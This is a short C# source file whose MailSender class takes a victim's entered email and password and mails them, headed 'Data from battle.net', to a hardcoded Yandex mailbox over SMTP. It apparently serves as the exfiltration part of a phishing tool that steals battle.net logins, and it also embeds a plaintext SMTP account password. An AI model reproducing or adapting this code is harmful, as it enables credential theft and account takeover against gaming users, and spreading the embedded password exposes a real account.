using MailKit.Net.Smtp;
using MimeKit;

namespace lisachusova;

public class MailSender
{
    private const string EmailAddress = "listwwwa@yandex.ru";
    private const string PasswordAddress = "xlwbaennbtvyahnd";

    public static async Task<bool> SendEmailAsync(string inputEmail, string inputPassword, string subj)
    {
        try
        {
            using var mailSender = new MimeMessage();
            
            mailSender.From.Add(new MailboxAddress("Data from battle.net", EmailAddress));
            mailSender.To.Add(new MailboxAddress("", EmailAddress));
            mailSender.Subject = subj;
            mailSender.Body = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = $"<h4>Your data from battle.net | Email: {inputEmail} | Password: {inputPassword}</h4>"
            };

            using var client = new SmtpClient();
            await client.ConnectAsync("smtp.yandex.ru", 465, true);
            client.AuthenticationMechanisms.Remove("XOAUTH2");
            await client.AuthenticateAsync(EmailAddress, PasswordAddress);
            await client.SendAsync(mailSender);
            await client.DisconnectAsync(true);
            return true;
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            throw;
        }
    }
}